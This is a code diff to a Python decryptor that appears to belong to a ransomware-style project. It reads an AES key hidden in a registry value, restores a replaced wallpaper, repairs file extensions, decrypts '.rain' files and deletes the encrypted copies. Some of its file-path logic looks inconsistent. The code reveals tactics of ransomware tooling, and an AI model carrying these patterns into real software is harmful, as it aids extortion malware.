@@ -2,10 +2,10 @@ from Crypto.Cipher import AES
 from winreg import *
 from shutil import copyfile
 from ctypes import windll
-from os import remove, rename
+from os import remove
 from os.path import splitext
-from time import sleep
 from struct import unpack, calcsize
+
 
 class Decrypt:
     def __init__(self, key=None, decryptor=None):
@@ -14,6 +14,7 @@ class Decrypt:
         self.get_key()
 
     def get_key(self):
+        # Searches for the key used in encrypting files. If not found, terminates execution
         winkey = OpenKey(HKEY_LOCAL_MACHINE, '')
         try:
             binkey = QueryValueEx(winkey, ' ')[0]
@@ -35,6 +36,7 @@ class Decrypt:
         return 0
 
     def restore_background(self, appdata: str):
+        # Restores the used background image before encryption.
         old = appdata + '/Microsoft/Windows/Themes/OldTranscodedWallpaper'
         changed = appdata + '/Microsoft/Windows/Themes/TranscodedWallpaper'
         copyfile(old, changed)
@@ -42,6 +44,9 @@ class Decrypt:
         windll.user32.SystemParametersInfoW(20, 0, changed, 0)
 
     def correct_ext(self, file: str):
+        """Corrects the file extension with the leading characters
+        (before the ".") entered during the data encryption process."""
+
         cnt = 0
         chars = []
 
@@ -60,17 +65,18 @@ class Decrypt:
         ext = ''.join(ext)
         filename = splitext(file)[0] + '.' + ext
 
-        with open(filename, 'rb') as f:
+        with open(file, 'rb') as f:
             cnt += 1
             f.seek(cnt)
             filedata = f.read()
 
-        with open(filename, 'wb') as f:
+        with open(file, 'wb') as f:
             f.write(filedata)
 
         return filename
 
     def decrypt_file(self, file: str, chunksize=64*2048):
+        # Decrypts a file with AES CBC mode using the key found in the system logs.
         originalpath = self.correct_ext(file)
 
         with open(file, 'rb') as fin:
@@ -93,5 +99,4 @@ class Decrypt:
                         fout.write(decd[:fsz])
                     fsz -= n
 
-decrypto = Decrypt()
-decrypto.decrypt_file('data.rain')
+        remove(file)
